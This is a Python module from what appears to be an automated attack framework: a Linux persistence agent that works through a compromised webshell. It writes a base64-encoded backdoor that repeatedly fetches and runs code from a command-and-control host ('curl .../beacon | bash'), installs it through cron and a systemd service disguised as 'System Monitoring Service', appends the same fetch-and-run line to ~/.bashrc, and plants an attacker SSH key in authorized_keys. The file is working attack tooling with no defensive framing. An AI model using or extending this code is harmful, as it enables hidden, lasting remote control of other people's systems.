"""
Linux Persistence Agent with BaseAgent integration
ฝังตัวในระบบ Linux แบบถาวร
"""

import asyncio
import base64
import hashlib
import os
from typing import Dict, List
from pathlib import Path

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log


class LinuxPersistence(BaseAgent):
    """Linux persistence mechanisms with BaseAgent support"""
    
    supported_phases = [AttackPhase.POST_EXPLOITATION, AttackPhase.PERSISTENCE]
    required_tools = []
    
    def __init__(self, context_manager=None, orchestrator=None, webshell_manager=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.webshell = webshell_manager
        self.backdoor_code = None
        
        # Get C2 configuration
        self.c2_domain = os.getenv('C2_DOMAIN', 'localhost:8000')
        self.c2_protocol = os.getenv('C2_PROTOCOL', 'http')
        self.c2_url = f"{self.c2_protocol}://{self.c2_domain}"
    
    async def run(self, directive: str, context: Dict) -> AgentData:
        """
        Main execution method for Linux persistence
        
        Args:
            directive: "install_all", "install_cron", "install_systemd", etc.
            context: {
                "shell_url": webshell URL,
                "shell_password": webshell password,
                "c2_url": C2 callback URL (optional, uses env if not provided),
                "technique": specific technique (optional)
            }
        
        Returns:
            AgentData with installation results
        """
        log.info(f"[LinuxPersistence] Starting with directive: {directive}")
        
        shell_url = context.get("shell_url")
        shell_password = context.get("shell_password")
        c2_url = context.get("c2_url", self.c2_url)
        
        if not all([shell_url, shell_password]):
            return AgentData(
                agent_name="LinuxPersistence",
                success=False,
                data={"error": "Missing required parameters: shell_url, shell_password"}
            )
        
        try:
            if directive == "install_all":
                result = await self.install_all(shell_url, shell_password, c2_url)
            elif directive == "install_cron":
                result = await self.install_cron(shell_url, shell_password)
            elif directive == "install_systemd":
                result = await self.install_systemd(shell_url, shell_password)
            elif directive == "install_bashrc":
                result = await self.install_bashrc(shell_url, shell_password)
            elif directive == "install_ssh_keys":
                result = await self.install_ssh_keys(shell_url, shell_password)
            elif directive == "install_ld_preload":
                result = await self.install_ld_preload(shell_url, shell_password)
            elif directive == "check":
                result = await self.check_persistence(shell_url, shell_password)
            else:
                result = await self.install_all(shell_url, shell_password, c2_url)
            
            success = result.get('success') or len(result.get('success', [])) > 0
            
            return AgentData(
                agent_name="LinuxPersistence",
                success=success,
                data=result
            )
        
        except Exception as e:
            log.error(f"[LinuxPersistence] Error: {e}")
            return AgentData(
                agent_name="LinuxPersistence",
                success=False,
                data={"error": str(e)}
            )
    
    async def install_all(self, 
                         shell_url: str,
                         shell_password: str,
                         c2_url: str) -> Dict:
        """
        Install all persistence mechanisms
        
        Args:
            shell_url: Webshell URL
            shell_password: Webshell password
            c2_url: C2 callback URL
        
        Returns:
            Dict with installation results
        """
        
        results = {
            'success': [],
            'failed': []
        }
        
        # Generate backdoor code
        self.backdoor_code = self._generate_backdoor_code(c2_url)
        
        # Try all persistence methods
        methods = [
            ('cron', self.install_cron),
            ('systemd', self.install_systemd),
            ('bashrc', self.install_bashrc),
            ('ssh_keys', self.install_ssh_keys),
            ('ld_preload', self.install_ld_preload),
        ]
        
        for name, method in methods:
            try:
                result = await method(shell_url, shell_password)
                if result.get('success'):
                    results['success'].append(name)
                    log.success(f"[LinuxPersistence] {name} installed successfully")
                else:
                    results['failed'].append(name)
                    log.warning(f"[LinuxPersistence] {name} installation failed")
            except Exception as e:
                results['failed'].append(f"{name}: {str(e)}")
                log.error(f"[LinuxPersistence] {name} error: {e}")
        
        return results
    
    async def install_cron(self, shell_url: str, shell_password: str) -> Dict:
        """
        Install cron job persistence
        
        Technique:
        (crontab -l; echo "*/5 * * * * curl http://c2.com/beacon | bash") | crontab -
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        # Create backdoor script
        backdoor_path = '/tmp/.system_update'
        
        # Write backdoor
        write_cmd = f"echo '{self.backdoor_code}' | base64 -d > {backdoor_path} && chmod +x {backdoor_path}"
        await self.webshell.execute_command(write_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Add to crontab
        cron_cmd = f"(crontab -l 2>/dev/null; echo '*/5 * * * * {backdoor_path} >/dev/null 2>&1') | crontab -"
        
        result = await self.webshell.execute_command(cron_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'cron',
            'path': backdoor_path,
            'interval': '5 minutes'
        }
    
    async def install_systemd(self, shell_url: str, shell_password: str) -> Dict:
        """Install systemd service persistence"""
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        service_name = self._generate_random_service_name()
        service_file = f"/etc/systemd/system/{service_name}.service"
        backdoor_path = f"/usr/local/bin/{service_name}"
        
        service_content = f"""[Unit]
Description=System Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart={backdoor_path}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
        
        # Write backdoor
        write_backdoor = f"echo '{self.backdoor_code}' | base64 -d > {backdoor_path} && chmod +x {backdoor_path}"
        await self.webshell.execute_command(write_backdoor, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Write service file
        service_b64 = base64.b64encode(service_content.encode()).decode()
        write_service = f"echo '{service_b64}' | base64 -d > {service_file}"
        await self.webshell.execute_command(write_service, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Enable and start service
        enable_cmd = f"systemctl daemon-reload && systemctl enable {service_name} && systemctl start {service_name}"
        await self.webshell.execute_command(enable_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'systemd',
            'service_name': service_name,
            'service_file': service_file,
            'backdoor_path': backdoor_path
        }
    
    async def install_bashrc(self, shell_url: str, shell_password: str) -> Dict:
        """Install .bashrc persistence"""
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        bashrc_cmd = f"curl {self.c2_url}/beacon | bash &"
        
        # Add to ~/.bashrc
        inject_cmd = f'echo "{bashrc_cmd}" >> ~/.bashrc'
        
        await self.webshell.execute_command(inject_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'bashrc',
            'file': '~/.bashrc'
        }
    
    async def install_ssh_keys(self, shell_url: str, shell_password: str) -> Dict:
        """Install SSH key persistence"""
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        # Generate SSH key (simplified - in production use proper key generation)
        ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@c2"
        
        # Add to authorized_keys
        inject_cmd = f'mkdir -p ~/.ssh && echo "{ssh_key}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
        
        await self.webshell.execute_command(inject_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'ssh_keys',
            'file': '~/.ssh/authorized_keys'
        }
    
    async def install_ld_preload(self, shell_url: str, shell_password: str) -> Dict:
        """Install LD_PRELOAD persistence"""
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        # This is a simplified version
        # In production, you'd compile a malicious .so file
        
        return {
            'success': False,
            'method': 'ld_preload',
            'error': 'Requires compiled .so file'
        }
    
    async def check_persistence(self, shell_url: str, shell_password: str) -> Dict:
        """Check which persistence mechanisms are installed"""
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        checks = {}
        
        # Check cron
        cron_check = await self.webshell.execute_command('crontab -l 2>/dev/null', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['cron'] = len(cron_check.get('output', '')) > 0
        
        # Check systemd
        systemd_check = await self.webshell.execute_command('systemctl list-units --type=service | grep -E "(monitor|check|update)"', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['systemd'] = len(systemd_check.get('output', '')) > 0
        
        # Check bashrc
        bashrc_check = await self.webshell.execute_command('cat ~/.bashrc 2>/dev/null | tail -5', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['bashrc'] = 'curl' in bashrc_check.get('output', '')
        
        # Check SSH keys
        ssh_check = await self.webshell.execute_command('cat ~/.ssh/authorized_keys 2>/dev/null', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['ssh_keys'] = 'attacker@c2' in ssh_check.get('output', '')
        
        return {
            'success': True,
            'installed': checks,
            'count': sum(checks.values())
        }
    
    def _generate_backdoor_code(self, c2_url: str) -> str:
        """Generate backdoor code"""
        
        backdoor_script = f'''#!/bin/bash
while true; do
    curl -s {c2_url}/beacon | bash
    sleep 300
done
'''
        
        return base64.b64encode(backdoor_script.encode()).decode()
    
    def _generate_random_service_name(self) -> str:
        """Generate random service name"""
        import random
        import string
        
        names = ['system-monitor', 'network-check', 'update-daemon', 'health-check']
        return random.choice(names)
